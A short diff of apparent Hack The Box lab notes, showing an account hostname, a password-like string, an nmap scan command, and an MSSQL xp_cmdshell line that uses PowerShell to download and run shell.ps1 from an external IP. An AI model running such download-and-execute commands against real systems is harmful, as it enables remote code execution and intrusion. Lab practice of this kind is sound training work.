@@ -3,7 +3,7 @@
 htb-ac-1444035@htb-pmuseptgcc.htb-cloud.com
 y2BDp1p8
 
-EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://95.111.254.81/shell.ps1'')"'# Nmap
+EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://95.111.254.81/shell.ps1'')"'
 
 ```
 nmap -sVC --min-rate 1500 -p- -Pn 10.10.11.68
